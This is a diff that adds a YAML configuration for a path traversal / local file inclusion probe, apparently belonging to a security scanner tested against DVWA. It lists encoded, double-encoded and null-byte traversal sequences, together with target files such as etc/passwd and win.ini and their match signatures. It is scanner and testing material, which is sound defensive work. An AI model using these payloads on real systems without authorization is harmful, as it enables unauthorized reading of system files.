@@ -1,0 +1,37 @@
+# Path traversal / LFI probe (CWE-22). Depth is tried at a few common
+# levels since the app's actual directory depth is unknown; encoded and
+# null-byte variants catch naive filtering. known_app_files lets a probe
+# confirm filtered traversal even when /etc/passwd itself is blocked, by
+# requesting a file we already know exists on the target (e.g. its own
+# entry page) via a traversal path back to itself.
+
+depths: [2, 4, 6, 8, 10, 12]
+
+unix_targets:
+  - path: "etc/passwd"
+    signature: "root:x:0:0"
+# etc/hosts was deliberately dropped: its only reliable content signature
+# is "localhost", which is far too generic -- confirmed in testing, it
+# matched a completely unrelated DVWA page that just happens to mention
+# "localhost" in normal page content, nowhere near an actual file read.
+
+windows_targets:
+  - path: "windows/win.ini"
+    signature: "[fonts]"
+  - path: "boot.ini"
+    signature: "[boot loader]"
+
+traversal_sequences:
+  - "../"
+  - "..\\"
+  - "..%2f"
+  - "..%5c"
+  - "%2e%2e%2f"
+  - "%2e%2e/"
+  - "..%252f"        # double-encoded
+  - "..%00/"          # null-byte (percent-encoded; raw NUL is added separately in code)
+
+absolute_prefixes:
+  - "/"
+  - "C:\\"
+  - "C:/"
